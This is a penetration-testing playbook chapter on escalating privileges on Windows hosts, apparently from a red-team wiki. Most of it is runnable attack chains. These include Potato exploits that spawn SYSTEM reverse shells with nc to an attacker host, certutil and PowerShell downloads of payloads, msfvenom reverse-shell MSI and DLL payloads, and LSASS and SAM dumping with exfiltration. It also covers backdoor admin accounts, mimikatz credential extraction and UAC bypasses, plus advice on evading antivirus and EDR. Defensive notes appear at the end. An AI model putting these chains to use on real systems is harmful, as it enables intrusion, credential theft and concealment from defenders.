---
title: "12 · Privilege Escalation (Local)"
---

# 12 · Privilege Escalation (Local)

> Service account → SYSTEM via SeImpersonate, unquoted paths, AlwaysInstallElevated.

!!! note "Phase overview"
    Once you have a shell as a service account (IIS, MSSQL, etc.), check whoami /priv. ***`SeImpersonatePrivilege`*** is the golden ticket; it lets you impersonate any token that comes your way, and Potato-family tools coerce a SYSTEM token into doing exactly that. `WinPEAS` automates the rest of the privesc surface.

!!! tip "First-five-minutes triage"
    The order that finds wins fastest:

    1. `whoami /priv` — token privileges (SeImpersonate, SeBackup, SeDebug, SeLoadDriver, etc.)
    2. `whoami /groups` — implicit group memberships (BUILTIN\Administrators with UAC filter, Backup Operators, etc.)
    3. `systeminfo` — OS version + patch level (drives Potato selection and kernel exploit feasibility)
    4. `winpeasx64.exe` — runs the rest while you're reading the above
    5. `cmdkey /list` + `dir C:\Users\*\Desktop` — quick cred and loot pass

    If you see SeImpersonate or SeAssignPrimaryToken, stop reading and go straight to #12.1. That's a five-second SYSTEM.

### 12.0 · Where you usually land + what to check

!!! info "Mapping context to attack surface"
    | Initial context | Most-likely privesc path | First check |
    |---|---|---|
    | IIS app pool (`iis apppool\*`) | SeImpersonate → Potato | `whoami /priv` |
    | MSSQL via xp_cmdshell (`nt service\mssqlserver`) | SeImpersonate → Potato | `whoami /priv` |
    | Custom Windows service account | SeImpersonate → Potato; cmdkey | `whoami /priv` + `cmdkey /list` |
    | Standard domain user RDP/WinRM | Service misconfig, AlwaysInstallElevated, unquoted paths | `winpeas` full sweep |
    | Local admin but UAC-filtered | UAC bypass → full admin token | `whoami /groups` (look for filtered SID) |
    | Backup Operators member | SeBackup/SeRestore → SAM/SYSTEM hive dump | `whoami /priv` |
    | Domain admin context (downgraded) | Already won — pivot to DC | n/a |

### 12.1 · Token Impersonation (SeImpersonatePrivilege)

!!! info "Why this works / how it chains"

    `GodPotato` is the most reliable on Server 2019/2022; it abuses RPC to coerce a SYSTEM token. PrintSpoofer works on most Windows 10/Server 2019. `RoguePotato` and `JuicyPotato` exist for older systems with different OXID resolution paths. Pick the one for your target's OS.

    Mechanic: holding `SeImpersonatePrivilege` means you can call `ImpersonateLoggedOnUser`/`CreateProcessWithToken` with **any** token handle you obtain. The Potato family's job is to trick a higher-privileged process (usually `NT AUTHORITY\SYSTEM`) into authenticating to a local NTLM endpoint you control, capture that authentication, and hand the resulting token to your impersonation API. Different Potatoes use different coercion mechanics (Print Spooler RPC, DCOM OXID resolution, RPC over named pipes), which is why some work on certain OS versions and not others.

!!! warning "What leads here"
    - Shell as a service account (IIS, MSSQL, custom app pool, etc.)
    - whoami /priv shows SeImpersonatePrivilege Enabled
    - **OR** SeAssignPrimaryTokenPrivilege Enabled (equivalent capability for our purposes)
    - Pre-installed service accounts that grant this by default: `IIS APPPOOL\*`, `NT SERVICE\MSSQLSERVER`, `NT AUTHORITY\NETWORK SERVICE`, `NT AUTHORITY\LOCAL SERVICE` (with caveats)

!!! tip "Pick the right Potato for the OS"
    | Tool | Win 7/8 | Win 10 | Server 2012 R2 | Server 2016 | Server 2019 | Server 2022 |
    |---|---|---|---|---|---|---|
    | JuicyPotato | ✅ | ✅ (early builds) | ✅ | ✅ | ❌ | ❌ |
    | RoguePotato | ✅ | ✅ | ✅ | ✅ | ✅ | partial |
    | PrintSpoofer | ❌ | ✅ | ❌ | ✅ | ✅ | ✅ (if Spooler running) |
    | GodPotato | ❌ | ✅ (1809+) | ❌ | ✅ | ✅ | ✅ |
    | EfsPotato | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ (anytime EFS RPC reachable) |
    | SweetPotato | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ (auto-picks variant) |

    Order of preference today: **GodPotato → PrintSpoofer → EfsPotato → RoguePotato → JuicyPotato**. SweetPotato is a "let it pick" all-in-one for when you're unsure.

```powershell title="Check + run the right potato"
# Some examples:

# Check
whoami /priv | findstr /i "impersonate\|token"

# GodPotato (Win2019/2022 - most reliable)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net localgroup administrators domain\user /add"
.\GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add"

# PrintSpoofer (Win10/Server 2019)
.\PrintSpoofer.exe -i -c cmd.exe
.\PrintSpoofer.exe -c "powershell -c whoami"

# RoguePotato (older systems)
.\RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe" -l 9999

# JuicyPotato (Server 2016/Win10)
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# Upload via WinRM then execute via xp_cmdshell
# evil-winrm: upload /tmp/cb.exe C:\ProgramData\cb.exe
# SQL: EXEC xp_cmdshell 'C:\ProgramData\cb.exe -cmd "cmd.exe /c command"'
```

```powershell title="More Potato variants worth knowing"
# EfsPotato (uses MS-EFSR locally, avoids Print Spooler dependency)
.\EfsPotato.exe "whoami /all"
.\EfsPotato.exe "net user hacker Pass123! /add" 2  # 2 = use a different EFS pipe

# SharpEfsPotato (C# port, friendlier with .NET runners)
.\SharpEfsPotato.exe -p "cmd.exe" -a "/c whoami"

# SweetPotato (auto-picks the working variant)
.\SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c whoami"
.\SweetPotato.exe -e PrintSpoofer -p cmd.exe -a "/c whoami"

# RoguePotato when the host can't reach the internet but can reach you on 135
# Run on attacker:
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:9999
# On target:
.\RoguePotato.exe -r <ATTACKER_IP> -e "C:\ProgramData\cb.exe" -l 9999

# Reverse shell payload via cmd
.\GodPotato.exe -cmd "cmd /c \\\\<ATTACKER>\\share\\nc.exe <ATTACKER> 4444 -e cmd.exe"
```

!!! example "Chain 1: MSSQL xp_cmdshell → SeImpersonate → SYSTEM"
    ```powershell
    # Position: SQL injection or stolen creds with sysadmin on MSSQL.

    # 1) Confirm xp_cmdshell available; enable if needed
    impacket-mssqlclient domain.local/svc_sql:'Pass123!'@<TARGET> -windows-auth
    SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    SQL> EXEC xp_cmdshell 'whoami /priv'
    # → SeImpersonatePrivilege Enabled (NT SERVICE\MSSQLSERVER)

    # 2) Stage GodPotato + a payload
    SQL> EXEC xp_cmdshell 'powershell -c "iwr http://<ATTACKER>/GodPotato.exe -o C:\ProgramData\gp.exe"'
    SQL> EXEC xp_cmdshell 'powershell -c "iwr http://<ATTACKER>/nc.exe -o C:\ProgramData\nc.exe"'

    # 3) Spawn a SYSTEM reverse shell
    SQL> EXEC xp_cmdshell 'C:\ProgramData\gp.exe -cmd "C:\ProgramData\nc.exe <ATTACKER> 4444 -e cmd.exe"'

    # 4) Catch on attacker
    nc -lvnp 4444
    C:\Windows\system32> whoami
    nt authority\system
    ```

!!! example "Chain 2: IIS App Pool → SYSTEM via PrintSpoofer"
    ```powershell
    # Position: webshell on IIS, running as IIS APPPOOL\DefaultAppPool

    # 1) Confirm the priv
    whoami /priv
    # → SeImpersonatePrivilege Enabled

    # 2) Drop PrintSpoofer (writable: C:\Windows\Temp, C:\Users\Public)
    certutil -urlcache -split -f http://<ATTACKER>/PrintSpoofer.exe C:\Windows\Temp\ps.exe

    # 3) Interactive (-i) gives a TTY-like SYSTEM shell. Through a webshell, prefer -c:
    C:\Windows\Temp\ps.exe -c "powershell -enc <BASE64_REV_SHELL>"

    # 4) Persistence (after pivoting to a real shell)
    net user backdoor 'Pa$$w0rd!' /add
    net localgroup administrators backdoor /add
    ```

!!! danger "Detection / OPSEC"
    - **Sysmon EventID 1** for the Potato binary launch + EventID 10 (CreateRemoteThread) when it touches lsass-adjacent processes
    - The default binary names (`GodPotato.exe`, `PrintSpoofer.exe`) are signatured by every modern AV. Rename, recompile from source with mods, or use SharpEfsPotato in-memory via execute-assembly
    - Print Spooler-based variants (PrintSpoofer) leave Spooler service event entries; EFS variants leave RPC-call traces in EFS logs
    - 4624 logon events show `NT AUTHORITY\SYSTEM` Logon Type 9 (NewCredentials) or 2 (Interactive) from a service-account-launched parent process — anomalous parentage
    - Disable Print Spooler and you defeat the PrintSpoofer family (recommend this in the report)

### 12.2 · Common Privesc Checks

!!! info "Why this works / how it chains"

    `WinPEAS` and `PowerUp` are the workhorses. They flag ***`AlwaysInstallElevated`*** (any user can install MSI as SYSTEM), unquoted service paths (drop your own exe in the gap), writable service binaries, stored credentials in cmdkey, and writable scheduled task XML.

```powershell title="Run the standard sweep"
.\winpeas.exe
Import-Module .\PowerUp.ps1; Invoke-AllChecks
whoami /all
cmdkey /list
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
icacls "C:\Program Files\service"  # writable service dirs
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|next run"
```

``` title="Common privesc paths"
AlwaysInstallElevated        → MSI install as SYSTEM
Unquoted service path        → Place exe in path gap
Writable service binary      → Replace binary
Stored credentials (cmdkey)  → runas /savecred
SeImpersonatePrivilege       → GodPotato/PrintSpoofer → SYSTEM
DLL hijacking                → Drop DLL in writable path
```

#### 12.2.1 · AlwaysInstallElevated

!!! info "What it is + why it pops"
    A pair of registry keys (`HKLM` + `HKCU`) that, when both set to `1`, instruct Windows Installer to run **every** MSI as SYSTEM regardless of who launched it. Originally intended for environments where users need to install vendor MSIs without admin rights. Almost never legitimately set in modern domains, but persists as legacy config in older estates.

```powershell title="Detect + exploit AlwaysInstallElevated"
# Check both required keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must equal 0x1

# Generate an MSI payload with msfvenom (attacker box)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 \
  -f msi -o evil.msi

# Or generate one that adds a local admin
msfvenom -p windows/adduser USER=hacker PASS='Pa$$w0rd!' \
  -f msi -o adduser.msi

# Transfer + install on target
certutil -urlcache -split -f http://<ATTACKER>/evil.msi C:\Windows\Temp\evil.msi
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi

# Cleanup (after exploitation, if MSI registered itself)
msiexec /x C:\Windows\Temp\evil.msi /quiet
```

#### 12.2.2 · Unquoted Service Paths

!!! info "What it is + why it pops"
    When a service registers a binary path with spaces but no surrounding quotes, e.g. `C:\Program Files\Vendor App\service.exe`, Windows tries each space-separated prefix as an executable: `C:\Program.exe`, `C:\Program Files\Vendor.exe`, `C:\Program Files\Vendor App\service.exe`. If you can write to any of those gap directories, drop a binary with the gap-name and Windows runs it as the service account on next start.

```powershell title="Find + exploit unquoted service paths"
# Find them
wmic service get name,displayname,pathname,startmode | findstr /i "auto" \
  | findstr /i /v "c:\windows" | findstr /i /v """

# Or with PowerShell
Get-WmiObject win32_service | ? { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } |
  Select Name,PathName,StartMode

# PowerUp does the heavy lifting
Import-Module .\PowerUp.ps1
Get-ServiceUnquoted

# Confirm you can write to the gap directory
icacls "C:\Program Files\Vendor App"
# Look for (M), (W), (F) on your user, BUILTIN\Users, Authenticated Users, or Everyone

# Drop a malicious binary at the gap path
copy evil.exe "C:\Program Files\Vendor.exe"
# Or for the deeper gap:
copy evil.exe "C:\Program Files\Vendor App\service.exe.bak"  # not exploitable here
copy evil.exe "C:\Program Files\Vendor App\service.exe"      # only if writable

# Restart the service (need permission, or wait for reboot)
sc stop VulnService
sc start VulnService

# If you can't restart, look at the service ACL
sc sdshow VulnService
# RP = SERVICE_START, WP = SERVICE_STOP — without these, you wait for reboot
```

#### 12.2.3 · Writable Service Binary / Service Config

!!! info "What it is + why it pops"
    A service whose binary file you can overwrite, OR whose configuration (`binPath`) you can modify. PowerUp's `Get-ModifiableServiceFile` and `Get-ModifiableService` find both.

```powershell title="Detect + exploit writable services"
# PowerUp checks
Import-Module .\PowerUp.ps1
Get-ModifiableService          # services where you can change config (binPath)
Get-ModifiableServiceFile      # services where you can overwrite the .exe on disk

# Manual check on a specific service
sc qc VulnService               # see binPath + start mode + run-as account
icacls "C:\path\to\service.exe" # check if writable

# Exploit: rewrite binPath (need SERVICE_CHANGE_CONFIG)
sc config VulnService binPath= "cmd.exe /c net user hacker Pa$$w0rd! /add && net localgroup administrators hacker /add"
sc stop VulnService
sc start VulnService

# Restore original
sc config VulnService binPath= "C:\Original\Path\service.exe"

# Exploit: overwrite the binary on disk
move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
copy evil.exe "C:\path\to\service.exe"
sc stop VulnService; sc start VulnService

# PowerUp one-shots (it generates the payload + restores after)
Invoke-ServiceAbuse -Name VulnService -Username hacker -Password 'Pa$$w0rd!'
Restore-ServiceBinary -Name VulnService
```

#### 12.2.4 · Stored Credentials (cmdkey + DPAPI + browsers)

!!! info "What it is + why it pops"
    Users save credentials all over the place: `cmdkey`/Credential Manager, browser password stores (DPAPI-protected), PuTTY/WinSCP saved sessions, RDP `.rdp` files with `pwd` blobs. A user-context shell can usually decrypt anything that user saved.

```powershell title="Hunt stored credentials"
# Credential Manager entries (visible to current user)
cmdkey /list

# Use a saved cred to launch as the target user (no password typing required)
runas /user:DOMAIN\admin /savecred "cmd.exe /c type \\<ATTACKER>\share\proof.txt"
# Note: /savecred only re-uses creds saved during a previous interactive runas

# DPAPI master key dump (offline crack later, or use mimikatz)
dir /a "%APPDATA%\Microsoft\Credentials\"
dir /a "%LOCALAPPDATA%\Microsoft\Credentials\"
dir /a "%APPDATA%\Microsoft\Protect\"

# Mimikatz: dump credman, browser, and DPAPI secrets
mimikatz # privilege::debug
mimikatz # sekurlsa::credman           # current logged-on credman entries
mimikatz # vault::list                 # Windows Vault items
mimikatz # vault::cred /patch          # decrypted vault creds
mimikatz # dpapi::cred /in:<file>      # decrypt a DPAPI blob
mimikatz # dpapi::chrome /in:"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" /unprotect

# SharpDPAPI (offensive PowerSploit successor, fileless)
SharpDPAPI.exe credentials /pvk:<masterkey>
SharpDPAPI.exe rdg
SharpDPAPI.exe vaults

# Saved RDP sessions in registry
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# Generic file searches
findstr /spin "password" *.txt *.xml *.ini *.config 2>nul
findstr /spin "passw" C:\Users\*\Documents\*.* 2>nul

# PuTTY private keys + saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions
dir /s /b "%USERPROFILE%\*.ppk" 2>nul

# WinSCP saved sessions (XML with cleartext or weakly-encoded passwords)
type "$env:APPDATA\WinSCP.ini" 2>nul
```

#### 12.2.5 · DLL Hijacking

!!! info "What it is + why it pops"
    Windows resolves DLL names by searching directories in a specific order. If a privileged process loads a DLL by name (not by absolute path) and you can write to **any** earlier-searched directory, your DLL gets loaded into the privileged process.

```powershell title="Detect + exploit DLL hijacking"
# Process Monitor (procmon64.exe) is the gold standard. Filter on:
#   Operation = CreateFile
#   Path ends with .dll
#   Result = NAME NOT FOUND or PATH NOT FOUND
# Each NAME-NOT-FOUND in a writable directory is a hijack candidate.

# PowerUp finds the simple cases automatically
Import-Module .\PowerUp.ps1
Find-PathDLLHijack       # writable dirs in $env:PATH
Find-ProcessDLLHijack    # running process DLL search paths

# Quick CLI version: dirs in PATH that you can write to
$env:PATH -split ';' | % { if (Test-Path $_) { icacls $_ 2>$null | Select-String 'Everyone|Authenticated Users|BUILTIN\\Users' | % { "$_`t<= $($_)" } } }

# Generate a payload DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f dll -o evil.dll

# Drop it in the writable path with the expected name (e.g., VERSION.dll, DWMAPI.dll)
copy evil.dll "C:\writable\path\VERSION.dll"

# Wait for the privileged process to load it (next service start, scheduled task, login)
```

### 12.3 · Other privileges worth knowing

!!! info "When `whoami /priv` shows something exotic"
    | Privilege | What it gets you | Exploit |
    |---|---|---|
    | `SeImpersonatePrivilege` | SYSTEM via Potato | #12.1 |
    | `SeAssignPrimaryTokenPrivilege` | Same as SeImpersonate (use a Potato) | #12.1 |
    | `SeBackupPrivilege` | Read **any** file (incl. `\Windows\System32\config\SAM`, `SYSTEM`) | `reg save HKLM\SAM sam.hive` |
    | `SeRestorePrivilege` | Write **any** file; replace service binaries | Pair with SeBackup for full read/write |
    | `SeTakeOwnershipPrivilege` | Take ownership of any object → grant yourself rights | `takeown /f <file>` then `icacls /grant` |
    | `SeDebugPrivilege` | Open any process token; LSASS dump | `procdump -accepteula -ma lsass lsass.dmp` then mimikatz offline |
    | `SeLoadDriverPrivilege` | Load a signed-but-vulnerable driver → kernel exec | Capcom.sys / `EOPLOADDRIVER` |
    | `SeManageVolumePrivilege` | Trigger SYSTEM-level operations via Volume Shadow | Specific exploits exist |
    | `SeTcbPrivilege` | "Act as part of the OS" — practically SYSTEM-equivalent | Direct token manipulation |

```powershell title="SeBackupPrivilege → SAM/SYSTEM dump → local admin hash"
# Confirm
whoami /priv | findstr /i Backup

# Save the registry hives (works because SeBackup bypasses the file ACLs)
reg save HKLM\SAM   C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive  # cached domain creds + LSA secrets

# Exfil
copy C:\Windows\Temp\*.hive \\<ATTACKER>\share\

# Offline: extract hashes
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# → local Administrator NTLM hash. Pass-the-Hash to anywhere this machine's
# local admin is reused (very common in lazy-imaging environments)
crackmapexec smb <SUBNET>/24 -u Administrator -H <NTHASH> --local-auth
```

```powershell title="SeDebugPrivilege → LSASS dump → domain creds"
# Confirm (often paired with elevated admin token, but not always)
whoami /priv | findstr /i Debug

# Dump LSASS (procdump from Sysinternals is signed → less likely to alert)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Alternatives that avoid the LSASS handle pattern (more EDR-friendly)
# - comsvcs.dll MiniDump (built-in)
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
# - nanodump (avoids dbghelp signatures)
nanodump.exe -w lsass.dmp

# Offline: parse with mimikatz on attacker box
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
# → cleartext passwords (Win < 8.1 or WDigest enabled), NT hashes, Kerberos tickets
```

```powershell title="SeTakeOwnership + SeRestore → arbitrary file write"
# Take ownership of a file you couldn't otherwise touch
takeown /f C:\path\to\protected.dll
icacls C:\path\to\protected.dll /grant <user>:F

# Replace a service binary with your payload
copy evil.dll C:\path\to\protected.dll
# Restart service or wait for reboot
```

### 12.4 · UAC bypass (admin-but-filtered → full admin token)

!!! info "When `whoami /groups` shows BUILTIN\Administrators but commands fail"
    Standard medium-integrity admins have a filtered token. UAC bypasses elevate to high-integrity without prompting. Useful when you have admin creds but no GUI to click "Yes" on.

```powershell title="UAC bypass quick reference"
# Confirm you're in the filtered state
whoami /groups | findstr /i "high\|medium"
# Medium Mandatory Level → filtered. High → already elevated.

# fodhelper.exe (registry-based, simple, signatured)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
fodhelper.exe
reg delete "HKCU\Software\Classes\ms-settings" /f

# computerdefaults.exe (similar pattern)
# eventvwr.exe (older, often patched)

# UACME (compendium of bypasses, pick a method by number)
.\Akagi.exe 23 cmd.exe   # method 23 = fodhelper variant
.\Akagi.exe 41 cmd.exe   # method 41 = ICMLuaUtil

# PowerShell-friendly: bypass-uac module, Invoke-PsUACme

# After bypass, verify
whoami /groups | findstr /i "high"
# → Mandatory Label\High Mandatory Level
```

### 12.5 · Worked end-to-end chains

!!! example "Chain A: Webshell → IIS appool → SYSTEM → domain creds"
    ```powershell
    # 1) Webshell as iis apppool\DefaultAppPool
    whoami
    # iis apppool\defaultapppool

    # 2) Triage
    whoami /priv
    # SeImpersonatePrivilege Enabled

    systeminfo | findstr /i "OS Name OS Version"
    # Windows Server 2019 Standard

    # 3) Stage GodPotato + nc
    certutil -urlcache -split -f http://<ATTACKER>/gp.exe C:\Windows\Temp\gp.exe
    certutil -urlcache -split -f http://<ATTACKER>/nc.exe C:\Windows\Temp\nc.exe

    # 4) SYSTEM reverse shell
    C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe <ATTACKER> 4444 -e cmd.exe"

    # 5) On the SYSTEM shell: dump LSASS for domain creds
    rundll32 C:\Windows\System32\comsvcs.dll,MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
    # Exfil + parse offline with mimikatz

    # 6) Cleanup
    del C:\Windows\Temp\gp.exe C:\Windows\Temp\nc.exe C:\Windows\Temp\lsass.dmp
    ```

!!! example "Chain B: Standard domain user → unquoted service → SYSTEM → cmdkey loot"
    ```powershell
    # 1) Foothold via RDP/WinRM as domain\bob (no special privs)
    whoami /priv
    # Nothing useful

    # 2) Run winpeas
    .\winPEASx64.exe quiet servicesinfo
    # → Unquoted Service Path: VulnSvc, C:\Program Files\Vendor App\svc.exe
    # → BUILTIN\Users has Modify on C:\Program Files\Vendor App

    # 3) Drop payload in the gap
    msfvenom -p windows/exec CMD='net localgroup administrators bob /add' \
      -f exe -o Vendor.exe
    copy Vendor.exe "C:\Program Files\Vendor.exe"

    # 4) Wait for service restart (or trigger it if you have permission)
    sc stop VulnSvc; sc start VulnSvc

    # 5) Confirm
    net localgroup administrators
    # → bob is now an admin

    # 6) Re-login to get an admin token, then loot cmdkey
    cmdkey /list
    # → DOMAIN\svc_backup (saved)
    runas /user:DOMAIN\svc_backup /savecred "cmd.exe /k whoami"

    # 7) Cleanup
    del "C:\Program Files\Vendor.exe"
    net localgroup administrators bob /delete
    ```

!!! example "Chain C: AlwaysInstallElevated → SYSTEM"
    ```powershell
    # 1) Confirm both keys (requires both)
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    # Both → 0x1

    # 2) Build the MSI on attacker
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 \
      -f msi -o pwn.msi

    # 3) Transfer + install
    certutil -urlcache -split -f http://<ATTACKER>/pwn.msi C:\Windows\Temp\pwn.msi
    msiexec /quiet /qn /i C:\Windows\Temp\pwn.msi

    # 4) Catch SYSTEM shell
    nc -lvnp 4444
    # whoami → nt authority\system

    # 5) Cleanup
    msiexec /x C:\Windows\Temp\pwn.msi /quiet
    del C:\Windows\Temp\pwn.msi
    ```

### 12.6 · OPSEC, detection, defenses

!!! danger "What defenders see when you privesc"
    - **Sysmon EID 1** for Potato binaries, msiexec installs from non-standard paths, sc config changes, cmd-spawn-cmd chains
    - **EID 4673/4674** for sensitive privilege use (SeImpersonate, SeDebug, SeBackup) — rare in clean envs, very high signal
    - **EID 4697** for service installation; **EID 7045** in System log
    - **EID 4720** account creation, **EID 4732** local admin group add — your `net user / net localgroup` lands here
    - LSASS process access (EID 10 from Sysmon) with `GrantedAccess = 0x1010` is the classic mimikatz/procdump pattern
    - Defender ASR rules: "Block credential stealing from LSASS" catches procdump on default-config endpoints
    - EDR catches: parent-child anomalies (`w3wp.exe` → `cmd.exe` → `gp.exe` is screaming at every modern EDR)

!!! tip "OPSEC playbook"
    - Rename Potato binaries; better, rebuild from source with strings/symbols stripped
    - Prefer in-memory execution (`execute-assembly`, `Invoke-ReflectivePEInjection`) over disk drops where the C2 supports it
    - Use built-ins where possible: `comsvcs.dll MiniDump` over procdump for LSASS, `wmic` over custom binaries
    - Keep payloads in `C:\Windows\Temp` or `C:\ProgramData` — these are universally writable and not unusual to see files in
    - Always `del` your stagers + clear the relevant logs entries you can (event log clearing itself is loud — usually better to leave noise than to clear logs)
    - Enumerate before exploiting: a noisy winpeas run from a service account is much less suspicious than a noisy potato that fails

!!! tip "Defenses to recommend in the report"
    - **Patch + maintain a vuln-driver block list** (`HVCI`, Microsoft's recommended block list) to neutralize SeLoadDriver
    - **Disable Print Spooler** on every server that isn't a print server — kills PrintSpoofer + half of the relay surface from #23
    - **Set `AlwaysInstallElevated = 0`** via GPO across the estate; this is rarely needed legitimately
    - **Audit and remove unquoted service paths**: `Get-WmiObject win32_service | ? PathName -notlike '"*' -and PathName -like '* *'`
    - **Restrict `SeImpersonatePrivilege`** to just the service accounts that genuinely need it; harden default IIS/SQL service hardening guides
    - **Enable Credential Guard** (`HVCI` + VBS) to neutralize most LSASS dumping
    - **WDAC / AppLocker** to block unsigned binaries running from `C:\Windows\Temp`, `C:\ProgramData`, user-writable paths
    - **Disable WDigest** (`UseLogonCredential = 0`) so cleartext passwords don't sit in LSASS
    - **Configure LAPS** so local admin hashes aren't reused across the estate (kills the pass-the-hash spread from #12.3)